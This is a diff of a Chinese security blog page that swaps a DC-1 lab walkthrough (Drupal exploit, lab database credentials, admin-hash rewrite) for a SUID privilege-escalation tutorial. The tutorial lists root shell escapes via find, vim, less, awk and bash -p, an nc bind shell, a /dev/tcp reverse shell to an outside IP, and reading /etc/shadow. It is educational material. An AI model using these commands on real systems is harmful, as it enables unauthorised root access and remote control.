@@ -20,48 +20,25 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="渗透靶机DC-1">
+  <meta name="description" content="SUID提权">
 <meta property="og:type" content="article">
-<meta property="og:title" content="渗透DC-1">
-<meta property="og:url" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/index.html">
+<meta property="og:title" content="SUID提权">
+<meta property="og:url" content="http://example.com/2023/11/15/SUID%E6%8F%90%E6%9D%83/index.html">
 <meta property="og:site_name" content="zzZxby&#39;s blog">
-<meta property="og:description" content="渗透靶机DC-1">
+<meta property="og:description" content="SUID提权">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No1.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No2.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No3.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No4.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No5.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No6.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No7.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No8.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No9.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No10.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No11.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No12.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No13.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No14.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No15.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No16.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No17.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No18.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No19.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No20.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No21.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No22.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No23.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No24.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No25.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No26.png">
-<meta property="og:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No27.png">
-<meta property="article:published_time" content="2023-11-08T14:02:30.000Z">
-<meta property="article:modified_time" content="2023-11-08T14:28:35.705Z">
+<meta property="og:image" content="http://example.com/2023/11/15/SUID%E6%8F%90%E6%9D%83/No1.png">
+<meta property="og:image" content="http://example.com/2023/11/15/SUID%E6%8F%90%E6%9D%83/No2.png">
+<meta property="og:image" content="http://example.com/2023/11/15/SUID%E6%8F%90%E6%9D%83/No3.png">
+<meta property="og:image" content="http://example.com/2023/11/15/SUID%E6%8F%90%E6%9D%83/No4.png">
+<meta property="article:published_time" content="2023-11-15T12:00:36.000Z">
+<meta property="article:modified_time" content="2023-11-15T12:03:27.824Z">
 <meta property="article:author" content="zzZxby">
 <meta property="article:tag" content="保持学习的热情">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No1.png">
+<meta name="twitter:image" content="http://example.com/2023/11/15/SUID%E6%8F%90%E6%9D%83/No1.png">
 
-<link rel="canonical" href="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/">
+<link rel="canonical" href="http://example.com/2023/11/15/SUID%E6%8F%90%E6%9D%83/">
 
 
 <script id="page-configurations">
@@ -74,7 +51,7 @@
   };
 </script>
 
-  <title>渗透DC-1 | zzZxby's blog</title>
+  <title>SUID提权 | zzZxby's blog</title>
   
 
 
@@ -295,7 +272,7 @@ mjx-container[display="true"] + br {
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/08/%E6%B8%97%E9%80%8FDC-1/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/15/SUID%E6%8F%90%E6%9D%83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/zzZ.jpg">
@@ -308,7 +285,7 @@ mjx-container[display="true"] + br {
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          渗透DC-1
+          SUID提权
         </h1>
 
         <div class="post-meta">
@@ -319,7 +296,7 @@ mjx-container[display="true"] + br {
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2023-11-08 22:02:30 / 修改时间：22:28:35" itemprop="dateCreated datePublished" datetime="2023-11-08T22:02:30+08:00">2023-11-08</time>
+              <time title="创建时间：2023-11-15 20:00:36 / 修改时间：20:03:27" itemprop="dateCreated datePublished" datetime="2023-11-15T20:00:36+08:00">2023-11-15</time>
             </span>
 
           <br>
@@ -328,16 +305,16 @@ mjx-container[display="true"] + br {
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>829</span>
+              <span>1.2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>5 分钟</span>
             </span>
-            <div class="post-description">渗透靶机DC-1</div>
+            <div class="post-description">SUID提权</div>
 
         </div>
       </header>
@@ -348,101 +325,82 @@ mjx-container[display="true"] + br {
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="靶机描述">靶机描述</h1>
-<p>下载地址：http://www.five86.com/downloads/DC-1.zip</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">The DC challenges are a series of purposely vulnerable labs for the purpose of gaining experience in the world of penetration testing.</span><br><span class="line"></span><br><span class="line">I started creating these vulnerable VMs so that beginners (people like me) can get an idea of what is involved with trying to break into a system (legally).</span><br><span class="line"></span><br><span class="line">When I started doing these kind of challenges late last year, I found that quite a few were more like puzzles. While they were fun, I was also a bit disappointed as I wanted to find some challenges that were more...realistic. That isn't to say that they were bad or not challenging, but I did get a bit tired of seeing the same things over and over again.</span><br><span class="line"></span><br><span class="line">So, with that in mind, you won't see:</span><br><span class="line">Any flags that have been base64 encoded</span><br><span class="line">Any brainfuck encoded flags</span><br><span class="line">Any "secret" text hidden in images (steganography)</span><br><span class="line">While DC-1 and DC-2 both have hints/clues as flags, from DC-3 onwards, there are no clues, just one flag that can be obtained with root privileges (directly, or indirectly).</span><br><span class="line"></span><br><span class="line">There are 9 DC releases in total, all of which were released in 2019.</span><br><span class="line"></span><br><span class="line">While the DC series has come to an official end after the release of DC-9, I have created a new series called Five86.</span><br><span class="line"></span><br><span class="line">I hope you enjoy the challenges as much as I enjoyed creating them.</span><br></pre></td></tr></table></figure>
-<h1 id="信息收集">信息收集</h1>
-<h2 id="目标主机发现">目标主机发现</h2>
-<p>扫描同网段存活主机</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No1.png"></p>
-<h2 id="端口扫描">端口扫描</h2>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 172.18.1.135</span><br></pre></td></tr></table></figure>
-<p>发现开启了三个端口，其中包括web应用</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No2.png"></p>
-<h2 id="web应用">web应用</h2>
-<p>采用drupal框架搭建的一套系统</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No3.png"></p>
-<h1 id="漏洞发现">漏洞发现</h1>
-<h2 id="漏洞探测">漏洞探测</h2>
-<p>工具：matesploit</p>
-<p>搜索相关漏洞信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No4.png"></p>
-<h2 id="漏洞攻击">漏洞攻击</h2>
-<p>选择一号payload进行攻击</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No5.png"></p>
-<p>设置目标主机ip，并运行payload</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No6.png"></p>
-<h1 id="漏洞利用">漏洞利用</h1>
-<h2 id="获取会话">获取会话</h2>
-<p>输入shell获取会话</p>
-<p>然后通过ls发现第一个flag</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No7.png"></p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No8.png"></p>
-<p>获取完第一个flag，以及提示，需要查看config文件</p>
-<h2 id="反弹shell">反弹shell</h2>
-<p>利用python反弹一个shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c "import pty;pty.spawn('/bin/bash')"</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No9.png"></p>
-<h2 id="查找配置文件">查找配置文件</h2>
-<p>drupal框架的配置文件名称为settings.php，由此可见该系统是由php语言开发</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name settings.php</span><br></pre></td></tr></table></figure>
-<p>查看配置文件，可以看到flag2</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No10.png"></p>
-<p>以及后面的数据库账号密码</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No11.png"></p>
-<h2 id="登录数据库">登录数据库</h2>
-<p>登录数据库，修改管理员账号密码，然后登录网站后台</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No12.png"></p>
-<p>查看管理员的密码</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No13.png"></p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No14.png"></p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No15.png"></p>
-<h2 id="修改管理员密码">修改管理员密码</h2>
-<p>这里加密方式我们不知道，但是我们可以尝试修改这个数据库的内容</p>
-<p>查询可知：drupal提供了可以直接修改管理员密码的方法。在scripts目录下存在一个password-hash.sh的文件，这可以将你输入进去明文密码转为hash值</p>
-<p>获取这个hash，然后去修改数据库的内容，就相当于修改了管理员的密码</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No16.png"></p>
-<p>在/var/www/下使用php scripts/password-hash.sh 123
-即可生成123这个字符串的hash值</p>
-<p>（这里php没有配置环境，需要再www/下运行）</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No17.png"></p>
-<p>得到这个hash，然后修改管理员密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update drupaldb.users set pass="$S$DJvkDG3OZUlM4pWJ84LzDaiHEbuj5vdrCI06IX3FePe5b9C8Cdv/" where name="admin";</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No18.png"></p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No19.png"></p>
-<h2 id="登录后台">登录后台</h2>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No20.png"></p>
-<h2 id="找到flag3">找到flag3</h2>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No21.png"></p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No22.png"></p>
-<h2 id="找到flag4">找到flag4</h2>
-<p>根据flag3的提示，后面我们需要做的就是提权操作</p>
-<p>首先我们查找所有flag字段的文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name "flag*"</span><br></pre></td></tr></table></figure>
-<p>查找到flag4</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No23.png"></p>
-<p>查找到flag4</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No24.png"></p>
-<h2 id="提权并找到flag5">提权并找到flag5</h2>
-<p>suid提权</p>
-<p>查找suid权限的所有文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No25.png"></p>
-<p>再进行提权操作，find需要一个指向性的查找，参数需要一个目标文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/misc -exec "/bin/sh" \;</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No26.png"></p>
-<p>最后找到最后一个flag</p>
-<p><img src="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/No27.png"></p>
+        <h1 id="介绍">介绍</h1>
+<p>SUID (Set
+UID)是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义.</p>
+<p>在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效.
+通俗的来讲,假设我们现在有一个可执行文件<code>ls</code>,其属主为root,当我们通过非root用户登录时,如果<code>ls</code>设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限.</p>
+<p>利用此特性,我们可通过SUID进行提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. SUID权限只能设置二进制文件</span><br><span class="line">2. 命令执行者要有二进制文件的执行权</span><br><span class="line">3. 命令执行者执行二进制文件时会获得该程序的属主身份</span><br><span class="line">4. SUID权限只在程序执行中有效</span><br><span class="line">即如果root给一个程序赋予了SUID权限，则普通用户在执行该程序过程中，是root权限</span><br></pre></td></tr></table></figure>
+<h1 id="设置suid">设置SUID</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename   设置SUID位</span><br><span class="line">chmod u-s filename   去掉SUID设置</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/15/SUID%E6%8F%90%E6%9D%83/No1.png"></p>
+<h1 id="常用的suid提权命令">常用的SUID提权命令</h1>
+<p>现在已知的具有SUID权限的二进制可执行文件大体有如下这些</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br><span class="line">awk</span><br></pre></td></tr></table></figure>
+<h1 id="查找拥有suid权限的程序">查找拥有SUID权限的程序</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb {} \;</span><br></pre></td></tr></table></figure>
+<p>命令解释</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ :代表根目录，也就是说从根目录开始查找</span><br><span class="line"></span><br><span class="line">-user ：按文件属主类型查找</span><br><span class="line"></span><br><span class="line">-perm：按文件权限来查找，4000，2000,1000为分别表示SUID,SGID,SBIT</span><br><span class="line"></span><br><span class="line">-print：将匹配到的文件进行标准输出</span><br><span class="line"></span><br><span class="line">2&gt;/dev/null : 2代表标准错误输出（文件描述符的一种），&gt;代表输出重定向，/dev/null是一个特殊的文件，输出到此文件的东西都会被丢弃，你为可以理解为垃圾桶</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/15/SUID%E6%8F%90%E6%9D%83/No2.png"></p>
+<h1 id="nmap提权">nmap提权</h1>
+<p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p>
+<p>现在nmap的版本都比较高，应该是很少了</p>
+<p>交互模式可以通过执行Nmap参数" <strong>interactive</strong> "</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>
+<p>以下命令将提供一个提升的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure>
+<h1 id="find提权">find提权</h1>
+<p>这个比较常用，在一些靶场的提权过程，都存在这个方法利用</p>
+<p>如果find命令也是以suid权限运行的话，则将通过find执行的所有命令都会以root权限执行</p>
+<p>如果你所查看的SUID权限里面没有find命令的话，可以采用以下命令，赋予其SUID权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s /usr/bin/find</span><br></pre></td></tr></table></figure>
+<p>查看是否find具有suid权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/15/SUID%E6%8F%90%E6%9D%83/No3.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch anyfile #必须要有这个文件</span><br><span class="line">find anyfile -exec whoami \;</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/11/15/SUID%E6%8F%90%E6%9D%83/No4.png"></p>
+<p>（虽然直接用的root权限，但是方法如此，只是做一个演示）</p>
+<p>进入shell方法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#进入shell</span></span><br><span class="line">find 1 -<span class="built_in">exec</span> <span class="string">'/bin/sh'</span> \;</span><br></pre></td></tr></table></figure>
+<p><strong>linux一般都安装了nc 我们也可以利用nc
+广播或反弹shell</strong></p>
+<p>广播shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find user -<span class="built_in">exec</span> nc -lvp 4444 -e <span class="string">'/bin/sh'</span> \;</span><br></pre></td></tr></table></figure>
+<p>在攻击机上:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 靶机ip 4444</span><br></pre></td></tr></table></figure>
+<p>反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find anyfile -<span class="built_in">exec</span> bash -c <span class="string">'bash -i &gt;&amp; /dev/tcp/114.xxx.xxx.96/4444 0&gt;&amp;1'</span> \;</span><br></pre></td></tr></table></figure>
+<p>在攻击机上:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+<h1 id="vim提权">vim提权</h1>
+<p>Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny /etc/shadow</span><br></pre></td></tr></table></figure>
+<p>通过vim进入shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim.tiny</span><br><span class="line"><span class="comment">#vim命令</span></span><br><span class="line">:<span class="built_in">set</span> shell = <span class="string">'/bin/sh'</span></span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+<h1 id="bash提权">bash提权</h1>
+<p>以下命令将以root权限打开一个bash shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2<span class="comment"># id</span></span><br><span class="line">uid=1002(service) gid=1002(service) euid=0(root) <span class="built_in">groups</span>=1002(service)</span><br></pre></td></tr></table></figure>
+<h1 id="less提权">less提权</h1>
+<p>less命令也可以进入shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line"><span class="comment">#在less中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+<h1 id="more提权">more提权</h1>
+<p>more命令进入shell和less相同</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">more /etc/passwd</span><br><span class="line"><span class="comment">#在more中输入:</span></span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>
+<p>要注意的是使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用<code>!</code>命令进入shell</p>
+<h1 id="nano提权">nano提权</h1>
+<p>nano也算是比较上古的文本编辑器了</p>
+<p>nano进入shell的方法为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nano #进入nano编辑器</span><br><span class="line">Ctrl + R</span><br><span class="line">Ctrl + X </span><br><span class="line">#即可输入命令</span><br></pre></td></tr></table></figure>
+<h1 id="cp提权">cp提权</h1>
+<p>使用cp 命令覆盖原来的<code>/etc/passwd</code>文件</p>
+<h1 id="awk提权">awk提权</h1>
+<p>awk命令进入shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">'BEGIN {system("/bin/bash")}</span></span><br></pre></td></tr></table></figure>
 <h1 id="总结">总结</h1>
-<ul>
-<li>信息收集，namp扫描</li>
-<li>msf的payload利用</li>
-<li>python反弹shell</li>
-<li>suid提权</li>
-</ul>
+<p>靶场居多，实战偏少，多总结，多利用，多学习</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权 -
+FreeBuf网络安全行业门户</a></p>
 
     </div>
 
@@ -458,13 +416,10 @@ mjx-container[display="true"] + br {
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/11/06/%E5%85%B3%E8%81%94%E7%88%86%E7%A0%B4%E9%97%AE%E9%A2%98/" rel="prev" title="关联爆破问题">
-      <i class="fa fa-chevron-left"></i> 关联爆破问题
+    <a href="/2023/11/08/%E6%B8%97%E9%80%8FDC-1/" rel="prev" title="渗透DC-1">
+      <i class="fa fa-chevron-left"></i> 渗透DC-1
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2023/11/15/SUID%E6%8F%90%E6%9D%83/" rel="next" title="SUID提权">
-      SUID提权 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -523,7 +478,7 @@ mjx-container[display="true"] + br {
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">靶机描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">2.1.</span> <span class="nav-text">目标主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E5%BA%94%E7%94%A8"><span class="nav-number">2.3.</span> <span class="nav-text">web应用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">漏洞发现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E4%BC%9A%E8%AF%9D"><span class="nav-number">4.1.</span> <span class="nav-text">获取会话</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">4.2.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 